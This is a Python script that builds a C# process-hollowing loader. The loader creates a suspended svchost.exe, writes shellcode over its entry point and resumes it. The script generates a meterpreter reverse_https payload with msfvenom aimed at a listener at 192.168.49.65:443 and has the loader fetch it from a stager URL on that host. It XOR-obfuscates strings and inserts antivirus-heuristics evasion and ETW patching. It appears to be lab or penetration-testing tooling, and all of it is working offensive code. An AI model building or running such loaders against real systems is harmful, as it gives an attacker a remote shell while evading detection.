#!/bin/env python3
from ak import *
import os
import subprocess

LHOST = "192.168.49.65"
LPORT = 443
BASE_FILENAME = 'win_hollow'
MSFVENOM_CMD = f"msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e generic/none"
SVCHOST_PATH = b"C:\\\\Windows\\system32\\svchost.exe"
XOR_KEY = b'\x09'
STAGER_URL = "http://192.168.49.65/sc"

def generate():
  svchost_path = Obfuscator(SVCHOST_PATH, XOR_KEY)
  url_dl_code = URL_DL_CODE.format(STAGER_URL=STAGER_URL)

  template = """
using System;
using System.Net;
using System.Runtime.InteropServices;

namespace Hallo
{{
    public class Program
    {{
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {{
                public Int32 cb;
                public string lpReserved;
                public string lpDesktop;
                public string lpTitle;
                public Int32 dwX;
                public Int32 dwY;
                public Int32 dwXSize;
                public Int32 dwYSize;
                public Int32 dwXCountChars;
                public Int32 dwYCountChars;
                public Int32 dwFillAttribute;
                public Int32 dwFlags;
                public Int16 wShowWindow;
                public Int16 cbReserved2;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
        }}

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {{
                public IntPtr hProcess;
                public IntPtr hThread;
                public int dwProcessId;
                public int dwThreadId;
        }}

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {{
                public IntPtr ExitStatus;
                public IntPtr PebAddress;
                public IntPtr AffinityMask;
                public IntPtr BasePriority;
                public IntPtr UniquePID;
                public IntPtr InheritedFromUniqueProcessId;
        }}

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess( string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);


        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 ZwQueryInformationProcess( IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, UInt32 ProcInfoLen, ref UInt32 retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory( IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

	{HEURISTICS_IMPORT}
	{ARCH_DETECTION}
	{ETW_FUNCS}

        static void Main(string[] args)
        {{
	    {HEURISTICS_CODE}
	    {ETW_PATCH}
	    {URL_DL_CODE}

            byte[] buf2 = new byte[] {{ {xor_svchost_path} }};

            for (int i = 0; i < buf2.Length; i++)
            {{
                buf2[i] = (byte)(((uint)buf2[i] ^ {xor_key}) & 0xFF);
            }}

            STARTUPINFO si = new STARTUPINFO();

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(null, System.Text.Encoding.Default.GetString(buf2), IntPtr.Zero,
                    IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;

            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;

            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);

            uint opthdr = e_lfanew_offset + 0x28;

            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
            ResumeThread(pi.hThread);

        }}
    }}
}}
""".format(HEURISTICS_IMPORT=HEURISTICS_IMPORT,
           HEURISTICS_CODE=HEURISTICS_CODE,
           ARCH_DETECTION=ARCH_DETECTION,
           ETW_FUNCS=ETW_FUNCS,
           ETW_PATCH=ETW_PATCH,
           URL_DL_CODE=url_dl_code,
           xor_key=svchost_path.get_key_csharp(),
           xor_svchost_path=svchost_path.get_hex_csharp()
           )

  print(template)
  f = open(BASE_FILENAME + '.cs', "w")
  f.write(template)
  f.close()

  print("Wrote "+ BASE_FILENAME + '.cs')


def compile():
  cmd = f"mcs {BASE_FILENAME}.cs"
  os.system(cmd)
  print("Wrote "+ BASE_FILENAME + '.exe')

def main():
  shellcode = ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)

  generate()
  compile() 

  f = open(BASE_FILENAME + '.sc', "wb")
  f.write(shellcode.get_bytes())
  f.close()
  print("Wrote shellcode to "+ BASE_FILENAME + '.sc')


if __name__ == "__main__":
  main()
